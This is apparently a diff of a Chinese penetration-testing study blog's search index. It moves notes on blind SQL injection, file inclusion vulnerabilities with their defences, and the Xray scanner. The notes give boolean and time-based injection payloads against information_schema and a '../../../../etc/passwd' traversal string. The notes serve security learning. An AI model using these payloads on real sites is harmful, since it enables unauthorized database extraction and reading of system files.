     <url>/2023/08/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<h1 id="渗透测试常用工具"><a href="#渗透测试常用工具" class="headerlink" title="渗透测试常用工具"></a>渗透测试常用工具</h1><h2 id="sqlmap-自动化SQL注入工具"><a href="#sqlmap-自动化SQL注入工具" class="headerlink" title="sqlmap       (自动化SQL注入工具)"></a>sqlmap       (自动化SQL注入工具)</h2><p>SQL注入：第一个漏洞[1998年的时候就提出]<br>OWASP TOP 10 年度十佳漏洞 （注入漏洞排第一）</p>
@@ -1330,6 +1302,90 @@
       </tags>
   </entry>
   <entry>
+    <title>盲注</title>
+    <url>/2023/08/21/%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="1-盲注的定义"><a href="#1-盲注的定义" class="headerlink" title="1.盲注的定义"></a>1.盲注的定义</h1><p>所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”</p>
+<p>没有回显的注入都可以使用盲注的做法:</p>
+<p>=&gt;联合查询没有输出点,union不能用,猜不出字段</p>
+<p>=&gt;报错注入无法使用[函数被禁,报错被关闭]</p>
+<p>注意:盲注很繁琐,适合于工具</p>
+<h1 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h1><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>页面还是有反应的,查到数据的时候页面是正常的，查不到的时候页面是错误,即布尔盲注拥有很明显的true和false但是没有报错信息.</p>
+<h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>select *from news where id=1 and database()=’’,如果是纯粹猜测,要猜到天荒地老.所以人们研究出来切割法,一位一位的分割出来,大大降低爆破难度</p>
+<h3 id="如何分割"><a href="#如何分割" class="headerlink" title="如何分割?"></a>如何分割?</h3><h4 id="1、判断目标有多长"><a href="#1、判断目标有多长" class="headerlink" title="1、判断目标有多长"></a>1、判断目标有多长</h4><p>length() 判断字符串长度</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">12</span> <span class="comment">-- qwe</span></span><br><span class="line">这就知道了库的长度</span><br></pre></td></tr></table></figure>
+<h4 id="2、开切"><a href="#2、开切" class="headerlink" title="2、开切"></a>2、开切</h4><p>需要一个sql函数, </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(切什么,从哪里开始切,切多长)</span><br><span class="line">	<span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="3、数字可以比较：599-gt-399"><a href="#3、数字可以比较：599-gt-399" class="headerlink" title="3、数字可以比较：599&gt;399"></a>3、数字可以比较：599&gt;399</h4><h4 id="4-字符串也可以比较"><a href="#4-字符串也可以比较" class="headerlink" title="4.字符串也可以比较"></a>4.字符串也可以比较</h4><p>如果可以比较字符，那就不需要一个一个试了，直接找区间</p>
+<p>此时引入ASCII编码,sql函数为:   ascii(你想转化的字符)</p>
+<h4 id="5-找库名表名字段名"><a href="#5-找库名表名字段名" class="headerlink" title="5.找库名表名字段名"></a>5.找库名表名字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">32</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 -- qwe&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="6-得到结果的ASCII码值-进行转码即可"><a href="#6-得到结果的ASCII码值-进行转码即可" class="headerlink" title="6.得到结果的ASCII码值,进行转码即可"></a>6.得到结果的ASCII码值,进行转码即可</h4><p>可以使用char()函数,不需要找ASCII表对照</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">char</span>(<span class="number">107</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">119</span>,<span class="number">111</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">105</span>,<span class="number">97</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h1><h2 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h2><p>无论做什么页面都一样,无论传参怎样,只返回一个true,页面都是正常的</p>
+<h2 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h2><p>通过传入延时函数来查看web页面返回是否延时来判断是否存在注入,同时利用if语句进行判断数据的正确与否</p>
+<h3 id="如何延时"><a href="#如何延时" class="headerlink" title="如何延时?"></a>如何延时?</h3><h4 id="1-延时函数"><a href="#1-延时函数" class="headerlink" title="1.延时函数"></a>1.延时函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; and sleep(10) -- qwe</span><br></pre></td></tr></table></figure>
+<h4 id="1-if-expr1-expr2-expr3"><a href="#1-if-expr1-expr2-expr3" class="headerlink" title="1.if(expr1,expr2,expr3)"></a>1.if(expr1,expr2,expr3)</h4><p>判断语句 如果第一个语句正确就执行第二个语句;如果错误执行第三个语句,即 if(条件，成立的时候XXX，不成立的时候XXX)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">120</span>,sleep(<span class="number">10</span>),<span class="number">0</span>)<span class="comment">-- qwe</span></span><br><span class="line"></span><br><span class="line"># 其余步骤和布尔盲注一样,只是根据延时与否判断是否为真</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/2023/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>攻击者利用包含的特性，加上应用本身对文件（包含）控制不严格，最终造成攻击者进行任意文件包含。（注：包含的文件会被当成脚本文件来解析）</p>
+<h2 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI :本地文件包含"></a>LFI :本地文件包含</h2><p> 本地文件包含(只能包含目标计算机上有的文件)</p>
+<h2 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI : 远程文件包含"></a>RFI : 远程文件包含</h2><p>远程文件包含（木马在别人的电脑上我也能包含）  罕见</p>
+<h1 id="易混淆的重点"><a href="#易混淆的重点" class="headerlink" title="易混淆的重点:"></a>易混淆的重点:</h1><p>文件包含是开发必备的功能,本身不是漏洞,但是任意文件包含就是漏洞;<br>同理,代码执行不是漏洞,任意代码执行才是漏洞</p>
+<h1 id="文件包含的本质："><a href="#文件包含的本质：" class="headerlink" title="文件包含的本质："></a>文件包含的本质：</h1><p>去除代码的冗余性<br>比如:a.php里面写好了数据库连接的函数,b.php中需要数据库的操作时,直接引用a.php就行</p>
+<h1 id="四个PHP的引用函数"><a href="#四个PHP的引用函数" class="headerlink" title="四个PHP的引用函数"></a>四个PHP的引用函数</h1><h2 id="include-出现几次就包含几次"><a href="#include-出现几次就包含几次" class="headerlink" title="include[出现几次就包含几次]"></a>include[出现几次就包含几次]</h2><p>使用include引用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行。</p>
+<h2 id="require"><a href="#require" class="headerlink" title="require"></a>require</h2><p>在php文件被执行之前，php解析器会让被引用的文件的全部内容替换require语句，然后与require语句之外的其他语句组成个新的php文件，最好后按新的php文件执行程序代码。</p>
+<h2 id="include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once"><a href="#include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once" class="headerlink" title="include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]"></a>include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]</h2><p>在导入文件前先检测该文件是否在该页面的其他部分被引用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明）</p>
+<h2 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h2><p>是require语句的延伸，他的功能与require语句基本一致，不同的是，在应用require_once时，先会检查要引用的文件是不是已将在该程序中的其他地方被引用过，如果有，则不会在重复调用该文件。（同时使用require_once语句在同一页面中引用了两个相同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）</p>
+<h2 id="（包含不存在文件的时候-include可以继续执行，require不可以）"><a href="#（包含不存在文件的时候-include可以继续执行，require不可以）" class="headerlink" title="（包含不存在文件的时候,include可以继续执行，require不可以）"></a>（包含不存在文件的时候,include可以继续执行，require不可以）</h2><h1 id="文件包含不区分文件后缀且不仅局限于包含根目录"><a href="#文件包含不区分文件后缀且不仅局限于包含根目录" class="headerlink" title="文件包含不区分文件后缀且不仅局限于包含根目录"></a>文件包含不区分文件后缀且不仅局限于包含根目录</h1><p>比如1.txt内是php代码,2.php包含1.txt时,页面会运行1.txt内的PHP语句</p>
+<p>同时,被包含的文件可以不存在于网站根目录,因为是通过函数和路径去寻找并包含的; 然而解析漏洞只能将木马上传到网站的目录下才可以getshell.</p>
+<h1 id="如何寻找文件包含漏洞"><a href="#如何寻找文件包含漏洞" class="headerlink" title="如何寻找文件包含漏洞"></a>如何寻找文件包含漏洞</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h2 id="2-当传参里出现XX-XX-比如index-php-XX-php"><a href="#2-当传参里出现XX-XX-比如index-php-XX-php" class="headerlink" title="2.当传参里出现XX.XX,比如index.php,XX.php"></a>2.当传参里出现XX.XX,比如index.php,XX.php</h2><p>(1)文件包含漏洞<br>(2)任意文件读取漏洞<br>(3)任意文件下载漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.XX.com/download/downfile.asp?filename=123.pdf </span><br><span class="line">可以尝试操作系统的敏感路径,比如../../../../etc/passwd或者window的各种敏感目录</span><br></pre></td></tr></table></figure>
+<h1 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h1><p>1、无需情况下设置allow_url_include和allow_url_fopen为关闭</p>
+<p>2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</p>
+<p>3、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。</p>
+<p>4、严格检查include类的文件包含函数中的参数是否外界可控。</p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>文件包含漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>自动化漏扫xray</title>
+    <url>/2023/08/21/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%89%ABxray/</url>
+    <content><![CDATA[<h1 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h1><p>自动化检测漏洞的工具 :AWVS | Xray | Nessus | appscan | Goby</p>
+<p>X-ray不开源,下载地址：<a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br>                    使用文档：<a href="https://docs.xray.cool/#/tutorial/introduce">https://docs.xray.cool/#/tutorial/introduce</a></p>
+<p>优点：<br>        1、省时省力<br>        2、人测试会容易有遗失，工具辅助一下，测试的会更全面</p>
+<p>缺点:<br>        1、容易出事<br>        2、容易误伤<br>        3、可能效果不佳、检测出来漏洞都过于典型和明显<br>        4、漏扫会给出一些莫名其妙的漏洞</p>
+<p>不知道他到底干了什么, 我手上有个1000条语句，可以测试200种漏洞。全部糊上去试试，看返回结果（野）,容易把目标搞瘫痪,比如后台有xss,误伤是因为类似爬虫,爬到目标网页的其他外链,就会误伤别的网站(政府网站那不就废了吗),而且可能效果不佳、检测出来漏洞都过于典型和明显</p>
+<h1 id="X-ray的命令"><a href="#X-ray的命令" class="headerlink" title="X-ray的命令"></a>X-ray的命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ws(webscan的缩写) </span><br><span class="line">		--url 指定当前页面扫描(不会扩展)  http://testphp.vulnweb.com </span><br><span class="line">			--url &quot;http://testphp.vulnweb.com/&quot;</span><br><span class="line">			--basic-crawler 模拟用户爬虫测试</span><br><span class="line">			--html-output 1.html 网页格式</span><br><span class="line"> 			--text 文本格式</span><br><span class="line">			--json json格式</span><br></pre></td></tr></table></figure>
+<h1 id="漏扫扫描方式："><a href="#漏扫扫描方式：" class="headerlink" title="漏扫扫描方式："></a>漏扫扫描方式：</h1><p>​        1、主动扫描<br>​            你给漏扫目标，让他去测试。<br>​        2、被动扫描<br>​            我不给他目标，让他自己去测。我把我浏览器的数据包给他，他根据我的数据包逐一测试</p>
+<p>1、安装浏览器代理插件foxyproxy，SwitchyOmega等都行</p>
+<p>2、启动Xray，生成ca证书命令：xray_windows_amd64.exe genca</p>
+<p>3、安装证书并信任（只装一次就可）浏览器安装证书的方法有所查别，具体可参考Xray的使用文档（Firefox 浏览器只能在浏览器内导入证书）</p>
+<p>4、运行Xray，开启监听命令：xray_windows_amd64.exe webscan —listen 127.0.0.1:7777 —html-output test.html5、浏览器启用代理，端口与 Xray 一致</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:8888 --html-output listen.html</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透工具</tag>
+        <tag>扫描</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网站基础</title>
     <url>/2023/08/21/%E7%BD%91%E7%AB%99%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="网站基础"><a href="#网站基础" class="headerlink" title="网站基础"></a>网站基础</h1><h2 id="1-网站的组成部分："><a href="#1-网站的组成部分：" class="headerlink" title="1.网站的组成部分："></a>1.网站的组成部分：</h2><h3 id="1-前端："><a href="#1-前端：" class="headerlink" title="(1)前端："></a>(1)前端：</h3><p>展示给用户看的东西(页面上显示的一切)[可以看见]   F12<br>            三件套：HTML:CSS:JS</p>
@@ -1369,62 +1425,6 @@
       </categories>
       <tags>
         <tag>建站</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>盲注</title>
-    <url>/2023/08/21/%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="1-盲注的定义"><a href="#1-盲注的定义" class="headerlink" title="1.盲注的定义"></a>1.盲注的定义</h1><p>所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”</p>
-<p>没有回显的注入都可以使用盲注的做法:</p>
-<p>=&gt;联合查询没有输出点,union不能用,猜不出字段</p>
-<p>=&gt;报错注入无法使用[函数被禁,报错被关闭]</p>
-<p>注意:盲注很繁琐,适合于工具</p>
-<h1 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h1><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><p>页面还是有反应的,查到数据的时候页面是正常的，查不到的时候页面是错误,即布尔盲注拥有很明显的true和false但是没有报错信息.</p>
-<h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>select *from news where id=1 and database()=’’,如果是纯粹猜测,要猜到天荒地老.所以人们研究出来切割法,一位一位的分割出来,大大降低爆破难度</p>
-<h3 id="如何分割"><a href="#如何分割" class="headerlink" title="如何分割?"></a>如何分割?</h3><h4 id="1、判断目标有多长"><a href="#1、判断目标有多长" class="headerlink" title="1、判断目标有多长"></a>1、判断目标有多长</h4><p>length() 判断字符串长度</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">12</span> <span class="comment">-- qwe</span></span><br><span class="line">这就知道了库的长度</span><br></pre></td></tr></table></figure>
-<h4 id="2、开切"><a href="#2、开切" class="headerlink" title="2、开切"></a>2、开切</h4><p>需要一个sql函数, </p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(切什么,从哪里开始切,切多长)</span><br><span class="line">	<span class="keyword">select</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<h4 id="3、数字可以比较：599-gt-399"><a href="#3、数字可以比较：599-gt-399" class="headerlink" title="3、数字可以比较：599&gt;399"></a>3、数字可以比较：599&gt;399</h4><h4 id="4-字符串也可以比较"><a href="#4-字符串也可以比较" class="headerlink" title="4.字符串也可以比较"></a>4.字符串也可以比较</h4><p>如果可以比较字符，那就不需要一个一个试了，直接找区间</p>
-<p>此时引入ASCII编码,sql函数为:   ascii(你想转化的字符)</p>
-<h4 id="5-找库名表名字段名"><a href="#5-找库名表名字段名" class="headerlink" title="5.找库名表名字段名"></a>5.找库名表名字段名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">32</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">&quot; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;1 -- qwe&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="6-得到结果的ASCII码值-进行转码即可"><a href="#6-得到结果的ASCII码值-进行转码即可" class="headerlink" title="6.得到结果的ASCII码值,进行转码即可"></a>6.得到结果的ASCII码值,进行转码即可</h4><p>可以使用char()函数,不需要找ASCII表对照</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">char</span>(<span class="number">107</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">119</span>,<span class="number">111</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">105</span>,<span class="number">97</span>);</span><br></pre></td></tr></table></figure>
-<h1 id="3-时间盲注"><a href="#3-时间盲注" class="headerlink" title="3.时间盲注"></a>3.时间盲注</h1><h2 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a>适用场景</h2><p>无论做什么页面都一样,无论传参怎样,只返回一个true,页面都是正常的</p>
-<h2 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h2><p>通过传入延时函数来查看web页面返回是否延时来判断是否存在注入,同时利用if语句进行判断数据的正确与否</p>
-<h3 id="如何延时"><a href="#如何延时" class="headerlink" title="如何延时?"></a>如何延时?</h3><h4 id="1-延时函数"><a href="#1-延时函数" class="headerlink" title="1.延时函数"></a>1.延时函数</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; and sleep(10) -- qwe</span><br></pre></td></tr></table></figure>
-<h4 id="1-if-expr1-expr2-expr3"><a href="#1-if-expr1-expr2-expr3" class="headerlink" title="1.if(expr1,expr2,expr3)"></a>1.if(expr1,expr2,expr3)</h4><p>判断语句 如果第一个语句正确就执行第二个语句;如果错误执行第三个语句,即 if(条件，成立的时候XXX，不成立的时候XXX)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">120</span>,sleep(<span class="number">10</span>),<span class="number">0</span>)<span class="comment">-- qwe</span></span><br><span class="line"></span><br><span class="line"># 其余步骤和布尔盲注一样,只是根据延时与否判断是否为真</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>自动化漏扫xray</title>
-    <url>/2023/08/21/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%89%ABxray/</url>
-    <content><![CDATA[<h1 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h1><p>自动化检测漏洞的工具 :AWVS | Xray | Nessus | appscan | Goby</p>
-<p>X-ray不开源,下载地址：<a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br>                    使用文档：<a href="https://docs.xray.cool/#/tutorial/introduce">https://docs.xray.cool/#/tutorial/introduce</a></p>
-<p>优点：<br>        1、省时省力<br>        2、人测试会容易有遗失，工具辅助一下，测试的会更全面</p>
-<p>缺点:<br>        1、容易出事<br>        2、容易误伤<br>        3、可能效果不佳、检测出来漏洞都过于典型和明显<br>        4、漏扫会给出一些莫名其妙的漏洞</p>
-<p>不知道他到底干了什么, 我手上有个1000条语句，可以测试200种漏洞。全部糊上去试试，看返回结果（野）,容易把目标搞瘫痪,比如后台有xss,误伤是因为类似爬虫,爬到目标网页的其他外链,就会误伤别的网站(政府网站那不就废了吗),而且可能效果不佳、检测出来漏洞都过于典型和明显</p>
-<h1 id="X-ray的命令"><a href="#X-ray的命令" class="headerlink" title="X-ray的命令"></a>X-ray的命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ws(webscan的缩写) </span><br><span class="line">		--url 指定当前页面扫描(不会扩展)  http://testphp.vulnweb.com </span><br><span class="line">			--url &quot;http://testphp.vulnweb.com/&quot;</span><br><span class="line">			--basic-crawler 模拟用户爬虫测试</span><br><span class="line">			--html-output 1.html 网页格式</span><br><span class="line"> 			--text 文本格式</span><br><span class="line">			--json json格式</span><br></pre></td></tr></table></figure>
-<h1 id="漏扫扫描方式："><a href="#漏扫扫描方式：" class="headerlink" title="漏扫扫描方式："></a>漏扫扫描方式：</h1><p>​        1、主动扫描<br>​            你给漏扫目标，让他去测试。<br>​        2、被动扫描<br>​            我不给他目标，让他自己去测。我把我浏览器的数据包给他，他根据我的数据包逐一测试</p>
-<p>1、安装浏览器代理插件foxyproxy，SwitchyOmega等都行</p>
-<p>2、启动Xray，生成ca证书命令：xray_windows_amd64.exe genca</p>
-<p>3、安装证书并信任（只装一次就可）浏览器安装证书的方法有所查别，具体可参考Xray的使用文档（Firefox 浏览器只能在浏览器内导入证书）</p>
-<p>4、运行Xray，开启监听命令：xray_windows_amd64.exe webscan —listen 127.0.0.1:7777 —html-output test.html5、浏览器启用代理，端口与 Xray 一致</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:8888 --html-output listen.html</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透工具</tag>
-        <tag>扫描</tag>
       </tags>
   </entry>
   <entry>
